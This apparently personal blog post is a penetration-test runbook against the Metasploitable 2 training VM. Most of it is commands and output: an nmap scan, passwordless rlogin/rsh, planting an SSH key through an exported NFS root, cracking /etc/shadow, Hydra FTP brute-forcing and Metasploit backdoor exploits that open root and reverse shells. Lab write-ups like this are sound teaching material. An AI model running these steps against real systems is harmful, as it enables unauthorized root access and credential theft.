---
layout: post
title:  "The Pentest Runbook Part 2 "
date:   2020-06-29 09:19:32 +0200
categories: alecsahew github.io Pentest Runbook
---

### Task and Environemnt 

* Pen Testing for Metasploitable 2  -  Network Services Test

### Used Tool 
* kali-linux 2020
* Nmap 
* John the Ripper
* Hydra
* Metasploit
* nc (netcat)

### Reconessaince  
* Scan all ports + service version + detect OS + banner grab
* nmap -v -oA recon.metasploitable 192.168.178.50 -sS -sV -O -p1-65535 --script banner

#### 1. List Of The Open Ports 

	Nmap -sV -O -p1-65535 192.168.178.50
	Nmap scan report for 192.168.178.50
	Host is up (0.0055s latency).
	Not shown: 65505 closed ports
	PORT      STATE SERVICE     VERSION
	21/tcp    open  ftp         vsftpd 2.3.4
	22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	23/tcp    open  telnet      Linux telnetd
	25/tcp    open  smtp        Postfix smtpd
	53/tcp    open  domain      ISC BIND 9.4.2
	80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
	111/tcp   open  rpcbind     2 (RPC #100000)
	139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
	445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
	512/tcp   open  exec?
	513/tcp   open  login?
	514/tcp   open  tcpwrapped
	1099/tcp  open  rmiregistry GNU Classpath grmiregistry
	1524/tcp  open  shell       Metasploitable root shell
	2049/tcp  open  nfs         2-4 (RPC #100003)
	2121/tcp  open  ftp         ProFTPD 1.3.1
	3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
	3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
	5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
	5900/tcp  open  vnc         VNC (protocol 3.3)
	6000/tcp  open  X11         (access denied)
	6667/tcp  open  irc         Unreal ircd
	6697/tcp  open  irc         Unreal ircd
	8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
	8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
	8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
	38869/tcp open  status      1 (RPC #100024)
	46013/tcp open  nlockmgr    1-4 (RPC #100021)
	49058/tcp open  mountd      1-3 (RPC #100005)
	53312/tcp open  unknown
	MAC Address: C4:85:08:25:DD:16 (Intel Corporate)
	Device type: general purpose
	Running: Linux 2.6.X
	OS CPE: cpe:/o:linux:linux_kernel:2.6
	OS details: Linux 2.6.9 - 2.6.33
	Uptime guess: 0.932 days (since Tue Jun 23 15:09:55 2020)
	Network Distance: 1 hop
	TCP Sequence Prediction: Difficulty=204 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	
### Report 

#### 2.0 Vulnerable Services

#### 2.1 513/tcp Analysis of Remote Login 

##### 513/tcp: rlogin possible without password 

	[~]$ rlogin -l root 192.168.178.50
	Last login: Tue Jun 23 08:49:00 EDT 2020 from :0.0 on pts/0
	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

	The programs included with the Ubuntu system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.

	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
	applicable law.

	To access official Ubuntu documentation, please visit:
	http://help.ubuntu.com/
	You have new mail.
	root@metasploitable:~#
	
#### 2.2 2049/tcp Analysis of NFS (Network File System)

##### 2049/tcp open  nfs: "/" the root of the file system is being exported

##### in this case a ssh key can be created and can be added to the ssh key of the victim machine for the root user

	[~]$ rpcinfo -p 192.168.178.50
		program vers proto   port  service
		100000    2   tcp    111  portmapper
		100000    2   udp    111  portmapper
		100024    1   udp  53667  status
		100024    1   tcp  38869  status
		100003    2   udp   2049  nfs
		100003    3   udp   2049  nfs
		100003    4   udp   2049  nfs
		100021    1   udp  54528  nlockmgr
		100021    3   udp  54528  nlockmgr
		100021    4   udp  54528  nlockmgr
		100003    2   tcp   2049  nfs
		100003    3   tcp   2049  nfs
		100003    4   tcp   2049  nfs
		100021    1   tcp  46013  nlockmgr
		100021    3   tcp  46013  nlockmgr
		100021    4   tcp  46013  nlockmgr
		100005    1   udp  54216  mountd
		100005    1   tcp  49058  mountd
		100005    2   udp  54216  mountd
		100005    2   tcp  49058  mountd
		100005    3   udp  54216  mountd
		100005    3   tcp  49058  mountd

	[ ~]$ showmount -e 192.168.178.50
	Export list for 192.168.178.50:
	/ *

##### with these prerequisites 

##### 1) a new SSH key can be generate on the attacking system

##### 2) the NFS export can be mounted 

##### 3) the key can added to the root user

##### 4) that leads to full access to the server via ssh 

	[ssh]# ssh-keygen
	Generating public/private rsa key pair.
	Enter file in which to save the key (/root/.ssh/id_rsa): 
	Enter passphrase (empty for no passphrase): 
	Enter same passphrase again: 
	Your identification has been saved in /root/.ssh/id_rsa.
	Your public key has been saved in /root/.ssh/id_rsa.pub.
	...
	[.ssh]# ll
	total 12
	-rw-------. 1 root root 1675 Jun 24 12:03 id_rsa
	-rw-r--r--. 1 root root  403 Jun 24 12:03 id_rsa.pub

	[ tmp]$ mkdir m000
	[.ssh]# mount -t nfs 192.168.178.50:/ /tmp/m000/
	[.ssh]# cat id_rsa.pub >> /tmp/m000/root/.ssh/authorized_keys
	[.ssh]# umount /tmp/m000

	[ ~]# ssh root@192.168.178.50 
	Last login: Wed Jun 24 04:24:48 2020 from x69x69.fritz.box
	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

	The programs included with the Ubuntu system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.

	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
	applicable law.

	To access official Ubuntu documentation, please visit:
	http://help.ubuntu.com/
	You have new mail.
	root@metasploitable:~# 

#### 2.3 Analysis of PASSWORDs

##### Weak Password

##### see chapter 2.2
	
	unshadow /tmp/m000/etc/passwd /tmp/m000/etc/shadow > merge.txt
 	john merge.txt
 	john --show merge.txt
 	sys:batmann
 	klog:123456789
 	service:service
 	user:user
 	postgres:postgres
 	msfadminr:sfadmin


#### 2.4 513/tcp: Analysis of Remote shell Protocol

##### 513/tcp: rsh login it is possible without password 

	[botticelli@x69x69 jack]$ rsh -l msfadmin 192.168.178.50 
	Last login: Thu Jun 25 01:25:04 EDT 2020 from a5bx5f.fritz.box on pts/1
	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

	The programs included with the Ubuntu system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.

	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.

	To access official Ubuntu documentation, please visit:
	http://help.ubuntu.com/
	No mail.
	msfadmin@metasploitable:~$ ifconfig                                                                                
	eth0      Link encap:Ethernet  HWaddr 00:0c:29:96:c6:4f  
    ........

#### 2.5 21/tcp: Analysis of FTP Port and his FTP service version VSFTPD 2.3.4

#### Exploiting Port 21/FTP 

	With the user and password list generated in 2.3 the file user.txt and passwd.txt are created: 
	
	hydra -L user.txt -P passwd.txt 192.168.178.50 ftp

	kali@Xkali:~/hydra$ hydra -L user.txt -P passwd.txt 192.168.178.50 ftp
	Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-29 08:58:38
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
	[DATA] attacking ftp://192.168.178.50:21/
	[21][ftp] host: 192.168.178.50   login: service   password: service
	[21][ftp] host: 192.168.178.50   login: postgres   password: postgres
	[21][ftp] host: 192.168.178.50   login: user   password: user
	1 of 1 target successfully completed, 3 valid passwords found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-29 08:58:46
	kali@Xkali:~/hydra$ 

	kali@Xkali:~/hydra$ ftp 192.168.178.50
	Connected to 192.168.178.50.
	220 (vsFTPd 2.3.4)
	Name (192.168.178.50:kali): msfadmin
	331 Please specify the password.
	Password:
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> 

#### Exploiting VSFTPD 2.3.4

	kali@Xkali:~$ searchsploit vsftpd
	--------------------------------------------------------------------------------------------------
	Exploit Title                                                         |  Path
	--------------------------------------------------------------------------------------------------
	vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption        | linux/dos/5814.pl
	vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)        | windows/dos/31818.sh
	vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)        | windows/dos/31819.pl
	vsftpd 2.3.2 - Denial of Service                                      | linux/dos/16270.c
	vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                | unix/remote/17491.rb
	--------------------------------------------------------------------------------------------------
	Shellcodes: No Results


	msf5 > search vsftpd

	Matching Modules
	================

	#  Name                                  Disclosure Date  Rank       Check  Description
	-  ----                                  ---------------  ----       -----  -----------
	0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

	msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
	msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.178.50
	rhost => 192.168.178.50
	msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

	[*] 192.168.178.50:21 - Banner: 220 (vsFTPd 2.3.4)
	[*] 192.168.178.50:21 - USER: 331 Please specify the password.
	[+] 192.168.178.50:21 - Backdoor service has been spawned, handling...
	[+] 192.168.178.50:21 - UID: uid=0(root) gid=0(root)
	[*] Found shell.
	[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.178.50:6200) at 2020-06-29 10:07:23 -0400

	ifconfig
	eth0      Link encap:Ethernet  HWaddr 00:0c:29:96:c6:4f  
          inet addr:192.168.178.50  Bcast:192.168.178.255  Mask:255.255.255.0
          inet6 addr: 2003:e8:72a:6900:20c:29ff:fe96:c64f/64 Scope:Global
          inet6 addr: fe80::20c:29ff:fe96:c64f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:11845 errors:0 dropped:0 overruns:0 frame:0
          TX packets:456 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:736687 (719.4 KB)  TX bytes:42674 (41.6 KB)
          Interrupt:16 Base address:0x2000 

#### 2.6 6667/tcp & 6697/tcp Analysis of UnrealIRCD 

#### Exploiting Port 6667 and 6697 (UnrealIRCD)

	msf5 > search UnrealIRCD

	Matching Modules
	================

	#  Name                                        Disclosure Date  Rank       Check  Description
	-  ----                                        ---------------  ----       -----  -----------
	0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution

	msf5 > use exploit/unix/irc/unreal_ircd_3281_backdoor
	msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.178.50
	RHOST => 192.168.178.50
	msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploits
	[-] Unknown command: exploits.
	msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

	[*] Started reverse TCP double handler on 192.168.178.45:4444 
	[*] 192.168.178.50:6667 - Connected to 192.168.178.50:6667...
		:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
	[*] 192.168.178.50:6667 - Sending backdoor command...
	[*] Accepted the first client connection...
	[*] Accepted the second client connection...
	[*] Command: echo Kj2Z1U8SMn1SdjeE;
	[*] Writing to socket A
	[*] Writing to socket B
	[*] Reading from sockets...
	[*] Reading from socket A
	[*] A: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\n"
	[*] Matching...
	[*] B is input...
	[*] Command shell session 1 opened (192.168.178.45:4444 -> 192.168.178.50:35992) at 2020-06-29 10:18:08 -0400
		id
	uid=0(root) gid=0(root)
	uname -a
	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

#### 2.7 23/tcp & 2121/tcp Analysis of TELNET & ProFTPD

#### Port 23 Exploiting TELNET & Access Port 2121 (ProFTPD)

	msf > search telnet_login

	Matching Modules
	================

	#  Name                                   Disclosure Date  Rank    Check  Description
	-  ----                                   ---------------  ----    -----  -----------
	0  auxiliary/scanner/telnet/telnet_login                   normal  No     Telnet Login Check Scanner

	msf > use auxiliary/scanner/telnet/telnet_login
	
	msf auxiliary (scanner/telnet/telnet_login) > set rhosts 192.168.178.50
	msf auxiliary (scanner/telnet/telnet_login) > set user_file /home/kali/hydra/user.txt
	msf auxiliary (scanner/telnet/telnet_login) > set pass_file /home/kali/hydra/passwd.txt
	msf auxiliary (scanner/telnet/telnet_login) > set stop_on_success true
	msf auxiliary (scanner/telnet/telnet_login) > exploit


	kali@Xkali:~$ telnet 192.168.178.50 2121
	Trying 192.168.178.50...
	Connected to 192.168.178.50.
	Escape character is '^]'.
	220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.178.50]
	....

to be continued ...	
